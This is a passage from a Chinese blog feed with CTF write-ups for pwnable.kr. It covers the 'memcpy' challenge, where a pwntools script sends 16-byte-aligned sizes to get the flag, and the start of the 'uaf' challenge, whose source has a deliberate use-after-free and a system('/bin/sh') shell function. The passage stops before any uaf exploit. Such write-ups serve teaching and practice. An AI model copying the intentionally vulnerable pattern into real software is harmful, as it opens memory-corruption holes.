    <content type="html"><![CDATA[<a id="more"></a><p><img src="pwnable.kr-memcpy.assets/image-20210208131853431.png">    </p><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// compiled with : gcc -o memcpy memcpy.c -m32 -lm</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="title">rdtsc</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">asm</span>(<span class="string">&quot;rdtsc&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">slow_memcpy</span><span class="params">(<span class="keyword">char</span>* dest, <span class="keyword">const</span> <span class="keyword">char</span>* src, <span class="keyword">size_t</span> len)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;len; i++) &#123;</span><br><span class="line">dest[i] = src[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">fast_memcpy</span><span class="params">(<span class="keyword">char</span>* dest, <span class="keyword">const</span> <span class="keyword">char</span>* src, <span class="keyword">size_t</span> len)</span></span>&#123;</span><br><span class="line"><span class="keyword">size_t</span> i;</span><br><span class="line"><span class="comment">// 64-byte block fast copy</span></span><br><span class="line"><span class="keyword">if</span>(len &gt;= <span class="number">64</span>)&#123;</span><br><span class="line">i = len / <span class="number">64</span>;</span><br><span class="line">len &amp;= (<span class="number">64</span><span class="number">-1</span>);</span><br><span class="line"><span class="keyword">while</span>(i-- &gt; <span class="number">0</span>)&#123;</span><br><span class="line">__asm__ __volatile__ (</span><br><span class="line"><span class="string">&quot;movdqa (%0), %%xmm0\n&quot;</span></span><br><span class="line"><span class="string">&quot;movdqa 16(%0), %%xmm1\n&quot;</span></span><br><span class="line"><span class="string">&quot;movdqa 32(%0), %%xmm2\n&quot;</span></span><br><span class="line"><span class="string">&quot;movdqa 48(%0), %%xmm3\n&quot;</span></span><br><span class="line"><span class="string">&quot;movntps %%xmm0, (%1)\n&quot;</span></span><br><span class="line"><span class="string">&quot;movntps %%xmm1, 16(%1)\n&quot;</span></span><br><span class="line"><span class="string">&quot;movntps %%xmm2, 32(%1)\n&quot;</span></span><br><span class="line"><span class="string">&quot;movntps %%xmm3, 48(%1)\n&quot;</span></span><br><span class="line">::<span class="string">&quot;r&quot;</span>(src),<span class="string">&quot;r&quot;</span>(dest):<span class="string">&quot;memory&quot;</span>);</span><br><span class="line">dest += <span class="number">64</span>;</span><br><span class="line">src += <span class="number">64</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// byte-to-byte slow copy</span></span><br><span class="line"><span class="keyword">if</span>(len) slow_memcpy(dest, src, len);</span><br><span class="line"><span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, _IOLBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hey, I have a boring assignment for CS class.. :(\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The assignment is simple.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;-----------------------------------------------------\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;- What is the best implementation of memcpy?        -\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;- 1. implement your own slow/fast version of memcpy -\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;- 2. compare them with various size of data         -\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;- 3. conclude your experiment and submit report     -\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;-----------------------------------------------------\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This time, just help me out with my experiment and get flag\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;No fancy hacking, I promise :D\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> t1, t2;</span><br><span class="line"><span class="keyword">int</span> e;</span><br><span class="line"><span class="keyword">char</span>* src;</span><br><span class="line"><span class="keyword">char</span>* dest;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> low, high;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> size;</span><br><span class="line"><span class="comment">// allocate memory</span></span><br><span class="line"><span class="keyword">char</span>* cache1 = mmap(<span class="number">0</span>, <span class="number">0x4000</span>, <span class="number">7</span>, MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">char</span>* cache2 = mmap(<span class="number">0</span>, <span class="number">0x4000</span>, <span class="number">7</span>, MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">src = mmap(<span class="number">0</span>, <span class="number">0x2000</span>, <span class="number">7</span>, MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> sizes[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// setup experiment parameters</span></span><br><span class="line"><span class="keyword">for</span>(e=<span class="number">4</span>; e&lt;<span class="number">14</span>; e++)&#123;<span class="comment">// 2^13 = 8K</span></span><br><span class="line">low = <span class="built_in">pow</span>(<span class="number">2</span>,e<span class="number">-1</span>);</span><br><span class="line">high = <span class="built_in">pow</span>(<span class="number">2</span>,e);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;specify the memcpy amount between %d ~ %d : &quot;</span>, low, high);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line"><span class="keyword">if</span>( size &lt; low || size &gt; high )&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;don&#x27;t mess with the experiment.\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">sizes[i++] = size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ok, lets run the experiment with your configuration\n&quot;</span>);</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// run experiment</span></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++)&#123;</span><br><span class="line">size = sizes[i];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;experiment %d : memcpy with buffer size %d\n&quot;</span>, i+<span class="number">1</span>, size);</span><br><span class="line">dest = <span class="built_in">malloc</span>( size );</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(cache1, cache2, <span class="number">0x4000</span>);<span class="comment">// to eliminate cache effect</span></span><br><span class="line">t1 = rdtsc();</span><br><span class="line">slow_memcpy(dest, src, size);<span class="comment">// byte-to-byte memcpy</span></span><br><span class="line">t2 = rdtsc();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ellapsed CPU cycles for slow_memcpy : %llu\n&quot;</span>, t2-t1);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(cache1, cache2, <span class="number">0x4000</span>);<span class="comment">// to eliminate cache effect</span></span><br><span class="line">t1 = rdtsc();</span><br><span class="line">fast_memcpy(dest, src, size);<span class="comment">// block-to-block memcpy</span></span><br><span class="line">t2 = rdtsc();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ellapsed CPU cycles for fast_memcpy : %llu\n&quot;</span>, t2-t1);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;thanks for helping my experiment!\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;flag : ----- erased in this source code -----\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="过程分析"><a href="#过程分析" class="headerlink" title="过程分析"></a>过程分析</h3><ul><li>在申请的内存小于64时，采用的是<code>slow_memcpy</code>逐个字节的复制，没有其他要求，但是速度较慢</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">slow_memcpy</span><span class="params">(<span class="keyword">char</span>* dest, <span class="keyword">const</span> <span class="keyword">char</span>* src, <span class="keyword">size_t</span> len)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;len; i++) &#123;</span><br><span class="line">dest[i] = src[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>在复制内存大于64个字节时，采用<code>fast_memcpy</code>中的指令复制，复制速度快</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">fast_memcpy</span><span class="params">(<span class="keyword">char</span>* dest, <span class="keyword">const</span> <span class="keyword">char</span>* src, <span class="keyword">size_t</span> len)</span></span>&#123;</span><br><span class="line"><span class="keyword">size_t</span> i;</span><br><span class="line"><span class="comment">// 64-byte block fast copy</span></span><br><span class="line"><span class="keyword">if</span>(len &gt;= <span class="number">64</span>)&#123;</span><br><span class="line">i = len / <span class="number">64</span>;</span><br><span class="line">len &amp;= (<span class="number">64</span><span class="number">-1</span>);</span><br><span class="line"><span class="keyword">while</span>(i-- &gt; <span class="number">0</span>)&#123;</span><br><span class="line">__asm__ __volatile__ (</span><br><span class="line"><span class="string">&quot;movdqa (%0), %%xmm0\n&quot;</span></span><br><span class="line"><span class="string">&quot;movdqa 16(%0), %%xmm1\n&quot;</span></span><br><span class="line"><span class="string">&quot;movdqa 32(%0), %%xmm2\n&quot;</span></span><br><span class="line"><span class="string">&quot;movdqa 48(%0), %%xmm3\n&quot;</span></span><br><span class="line"><span class="string">&quot;movntps %%xmm0, (%1)\n&quot;</span></span><br><span class="line"><span class="string">&quot;movntps %%xmm1, 16(%1)\n&quot;</span></span><br><span class="line"><span class="string">&quot;movntps %%xmm2, 32(%1)\n&quot;</span></span><br><span class="line"><span class="string">&quot;movntps %%xmm3, 48(%1)\n&quot;</span></span><br><span class="line">::<span class="string">&quot;r&quot;</span>(src),<span class="string">&quot;r&quot;</span>(dest):<span class="string">&quot;memory&quot;</span>);</span><br><span class="line">dest += <span class="number">64</span>;</span><br><span class="line">src += <span class="number">64</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// byte-to-byte slow copy</span></span><br><span class="line"><span class="keyword">if</span>(len) slow_memcpy(dest, src, len);</span><br><span class="line"><span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用使用指令<code>nc pwnable.kr 9022</code>连接，随便输入了一些值过后发现永远停留在了第四次检测，但是如果在本地输入却可以通过</p><ul><li><p><strong>movdqa</strong>指令</p><p><code>movdqa</code>指令的操作数都要求16字节对齐，在本地可以正常运行时因为malloc本身就是8字节对齐的，加上8个字节的chunk头，malloc返回的指针就已经遵循16字节对齐了，所以随便输入也可以正常运行，但是在靶机上可能是因为Ubuntu版本的问题，chunk在内存中是连续的，而不遵循内存对齐，所以需要我们自己计算。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 计算在范围中可输入的数字那些符合要求</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>, <span class="number">13</span>):</span><br><span class="line">    <span class="keyword">if</span> i&lt;<span class="number">6</span>:</span><br><span class="line">        chunk_size[i<span class="number">-3</span>].append(pow(<span class="number">2</span>,i))</span><br><span class="line">    <span class="keyword">if</span> i &gt;= <span class="number">6</span>:</span><br><span class="line">        <span class="keyword">for</span> size <span class="keyword">in</span> range(pow(<span class="number">2</span>, i), pow(<span class="number">2</span>, i+<span class="number">1</span>)):</span><br><span class="line">            <span class="keyword">if</span> (size<span class="number">-8</span>)%<span class="number">16</span> == <span class="number">0</span>:</span><br><span class="line">                chunk_size[i<span class="number">-3</span>].append(size)</span><br></pre></td></tr></table></figure></li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;pwnable.kr&#x27;</span>, <span class="number">9022</span>)</span><br><span class="line">chunk_size = [[], [], [], [], [], [], [], [], [], [], []]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>, <span class="number">13</span>):</span><br><span class="line">    <span class="keyword">if</span> i&lt;<span class="number">6</span>:</span><br><span class="line">        chunk_size[i<span class="number">-3</span>].append(pow(<span class="number">2</span>,i))</span><br><span class="line">    <span class="keyword">if</span> i &gt;= <span class="number">6</span>:</span><br><span class="line">        <span class="keyword">for</span> size <span class="keyword">in</span> range(pow(<span class="number">2</span>, i), pow(<span class="number">2</span>, i+<span class="number">1</span>)):</span><br><span class="line">            <span class="keyword">if</span> (size<span class="number">-8</span>)%<span class="number">16</span> == <span class="number">0</span>:</span><br><span class="line">                chunk_size[i<span class="number">-3</span>].append(size)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>, <span class="number">13</span>):</span><br><span class="line">    string = <span class="string">&#x27;specify the memcpy amount between &#123;&#125; ~ &#123;&#125; : &#x27;</span>.format(pow(<span class="number">2</span>,i), pow(<span class="number">2</span>,i+<span class="number">1</span>))</span><br><span class="line">    sh.sendlineafter(string, str(chunk_size[i<span class="number">-3</span>][<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line">log.success(sh.recv())</span><br></pre></td></tr></table></figure><p><img src="pwnable.kr-memcpy.assets/image-20210212203957532.png"></p><ul><li><p>接收</p><p><img src="pwnable.kr-memcpy.assets/image-20210212204107864.png"></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;p&gt;&lt;img src=&quot;pwnable.kr-memcpy.assets/image-20210208131853431.png&quot;&gt;    &lt;/p&gt;
&lt;h3 id=&quot;源码&quot;&gt;&lt;a href=&quot;#源码&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="pwn" scheme="http://example.com/categories/CTF/pwn/"/>
    
    <category term="pwnable.kr" scheme="http://example.com/categories/CTF/pwn/pwnable-kr/"/>
    
    
    <category term="wp" scheme="http://example.com/tags/wp/"/>
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.kr uaf</title>
    <link href="http://example.com/2021/02/05/CTF/pwn/pwnable/pwnable..kr-uaf/"/>
    <id>http://example.com/2021/02/05/CTF/pwn/pwnable/pwnable..kr-uaf/</id>
    <published>2021-02-05T15:33:16.078Z</published>
    <updated>2021-05-03T17:11:31.281Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><p><img src="pwnable..kr-uaf.assets/image-20210208131805440.png"></p><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span>&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">give_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">                system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">        <span class="keyword">int</span> age;</span><br><span class="line">        <span class="built_in">string</span> name;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;My name is &quot;</span> &lt;&lt; name &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;I am &quot;</span> &lt;&lt; age &lt;&lt; <span class="string">&quot; years old&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Man</span>:</span> <span class="keyword">public</span> Human&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">        Man(<span class="built_in">string</span> name, <span class="keyword">int</span> age)&#123;</span><br><span class="line">                <span class="keyword">this</span>-&gt;name = name;</span><br><span class="line">                <span class="keyword">this</span>-&gt;age = age;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">                Human::introduce();</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;I am a nice guy!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Woman</span>:</span> <span class="keyword">public</span> Human&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">Woman(<span class="built_in">string</span> name, <span class="keyword">int</span> age)&#123;</span><br><span class="line">                <span class="keyword">this</span>-&gt;name = name;</span><br><span class="line">                <span class="keyword">this</span>-&gt;age = age;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">                Human::introduce();</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;I am a cute girl!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">        Human* m = <span class="keyword">new</span> Man(<span class="string">&quot;Jack&quot;</span>, <span class="number">25</span>);</span><br><span class="line">        Human* w = <span class="keyword">new</span> Woman(<span class="string">&quot;Jill&quot;</span>, <span class="number">21</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">size_t</span> len;</span><br><span class="line">        <span class="keyword">char</span>* data;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> op;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;1. use\n2. after\n3. free\n&quot;</span>;</span><br><span class="line">                <span class="built_in">cin</span> &gt;&gt; op;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">switch</span>(op)&#123;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                                m-&gt;introduce();</span><br><span class="line">                                w-&gt;introduce();</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                                len = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">                                data = <span class="keyword">new</span> <span class="keyword">char</span>[len];</span><br><span class="line">                                read(open(argv[<span class="number">2</span>], O_RDONLY), data, len);</span><br><span class="line">                                <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;your data is allocated&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                                <span class="keyword">delete</span> m;</span><br><span class="line">                                <span class="keyword">delete</span> w;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">default</span>:</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Ues-After-Free"><a href="#Ues-After-Free" class="headerlink" title="Ues After Free"></a>Ues After Free</h3><p>​        